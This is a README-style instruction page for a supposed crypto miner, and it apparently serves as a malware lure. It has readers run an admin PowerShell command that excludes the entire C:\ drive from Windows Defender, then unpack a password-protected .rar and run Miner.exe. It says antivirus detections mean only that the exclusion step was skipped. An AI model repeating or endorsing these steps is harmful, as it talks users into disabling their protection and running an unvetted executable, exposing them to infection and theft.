# How to use

Firstly, run this command in powershell as admin: Add-MpPreference -ExclusionPath "C:\\"
Then download the .rar file and unpack it. The file password is 2024 btw.
Then open the config.json file and enter ur crypto wallet address it should mine and pay to.
Then when that is done Run the Miner.exe and have it mine for a few hours. (you get paid every 24 hours btw)

# Help my antivirus is deleting the file

That is most likely because you didnt run the command i showed you earlier. Run it in powershell as administrator and type this exact command: Add-MpPreference -ExclusionPath "C:\\"

# Can't unpack?

download the winrar file manager from https://www.win-rar.com/start.html?&L=0 and run the installer then try to unpack the .rar file.
